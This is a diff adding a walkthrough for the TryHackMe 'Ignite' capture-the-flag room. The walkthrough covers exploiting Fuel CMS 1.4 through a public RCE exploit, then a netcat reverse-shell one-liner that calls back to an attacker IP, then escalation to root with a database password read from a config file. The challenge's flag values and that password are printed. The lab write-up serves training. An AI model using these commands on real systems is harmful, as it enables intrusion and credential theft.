@@ -1,0 +1,106 @@
+The Ignite room on TryHackMe is a Capture The Flag (CTF) challenge where you'll compromise a web server running the Fuel CMS application. The objective is to find two flags: user.txt and root.txt.
+This walkthrough covers the complete attack path: 
+1. Initial reconnaissance
+2. Exploiting a known Remote Code Execution (RCE) vulnerability
+3. Establishing a reverse shell
+4. Privilege escalation via discovered credentials
+5. Capturing the final flags
+
+*****************
+a).Reconnaissance
+*****************
+Start by scanning the target machine to identify open ports and services.
+Command: nmap -sS -A -T4 -p- <IP-ADDR> -oN nmap.txt
+
+Scan Results:
+
+    Port 80/tcp - open (Apache httpd 2.4.18 on Ubuntu)
+
+    HTTP Title - "Welcome to FUEL CMS"
+
+    robots.txt - disallows /fuel/ 
+
+Visiting the website reveals Fuel CMS version 1.4. The footer of the page also contains default credentials: admin:admin
+
+*************************************
+b).Initial Foothold - Exploiting RCE
+Finding the Exploit
+*************************************
+
+Fuel CMS 1.4 is vulnerable to Remote Code Execution. Use searchsploit to locate available exploits 
+Command: searchsploit fuel cms 1.4
+
+Results include:
+
+    47138.py - Remote Code Execution (1)
+
+    50477.py - Remote Code Execution (3) - Recommended
+
+Executing the RCE
+
+Run the exploit to gain command execution on the target
+Command: python3 50477.py -u http://<TARGET_IP>/
+
+The exploit provides a limited interactive shell where you can run system commands.
+
+Verification: 
+Enter Command $
+
+Locating user.txt
+
+The first flag is located in the www-data home directory
+Enter Command $ cat /home/www-data/flag.txt
+6470e394cbf6dab6a91682cc8585059b
+
+User Flag: 6470e394cbf6dab6a91682cc8585059b
+
+*******************************
+3. Establishing a reverse shell
+*******************************
+On Attacker Machine
+Start a Netcat listener 
+Command: nc -lvnp 4444
+
+On Target (via RCE)
+Execute the following reverse shell command (replace YOUR_IP with your TryHackMe VPN IP)
+Command: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc YOUR_IP 4444 > /tmp/f
+
+Upgrading the Shell
+Once connected, upgrade to an interactive TTY shell for better functionality
+Command: python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+***********************
+4. Privilege Escalation
+***********************
+Finding Database Credentials
+
+Navigate to the Fuel CMS application configuration directory
+Command: 
+cd /var/www/html/fuel/application/config/
+cat database.php
+
+The configuration reveals MySQL credentials including the root password 
+$db['default'] = array(
+    'hostname' => 'localhost',
+    'username' => 'root',
+    'password' => 'mememe',
+    'database' => 'fuel_schema',
+    ...
+);
+
+Switching to Root User
+
+These credentials work for the system's root user. Switch user with the discovered password
+Command:
+su root
+Password: mememe
+
+Capturing root.txt
+
+Navigate to the root directory to find the final flag
+Command:
+cat /root/root.txt
+b9bbcb33e11b80be759c4e844862482d
+
+
+
